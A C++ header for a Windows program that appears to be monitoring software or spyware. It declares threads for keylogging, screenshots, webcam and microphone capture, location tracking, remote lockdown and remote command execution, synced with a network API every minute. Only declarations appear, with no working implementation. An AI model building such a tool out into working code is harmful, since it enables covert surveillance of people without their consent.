#pragma once
#include <windows.h>
#include "../Control/Keylogger.h"
#include "../Control/Recorder.h"
#include "../Control/Camera.h"
#include "../DataManagement/Converters.h"
#include "../Network/Connect.h"
#include "../Control/Screenshoter.h"
#include "../Control/Lockdown.h"
#include "../Network/ApiOperations.h"
#include "../Control/LocationTracker.h"
#include "../Control/Filter.h"
#include "../Control/Commander.h"

#include <string>
#include <iterator>
#include <time.h>
#include <shellapi.h>
#include <queue>
#include <cwctype>

#define DATA_TYPE "dataType"

struct CompareDates {
	bool operator() (WIN32_FIND_DATA data1, WIN32_FIND_DATA data2) const {
		return data1.ftCreationTime.dwLowDateTime < data2.ftCreationTime.dwLowDateTime;
	}
};

#pragma warning(disable:4996) // Disable "unsafe" warnings
#define SYNC_TIME 60000 // 1 minute

DWORD WINAPI initFiltering(LPVOID lpParam);
DWORD WINAPI initKeylogger(LPVOID lpParam);
DWORD WINAPI initScreenshot(LPVOID lpParam);
DWORD WINAPI initCamera(LPVOID lpParam);
DWORD WINAPI initMic(LPVOID lpParam);
DWORD WINAPI initRemoteLockdown(LPVOID lpParam);
DWORD WINAPI initRemoteCommands(LPVOID lpParam);
DWORD WINAPI initLocationTracker(LPVOID lpParam);
DWORD WINAPI initDataManager(LPVOID lpParam);
DWORD WINAPI initRequestManager(LPVOID lpParam);

BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle);
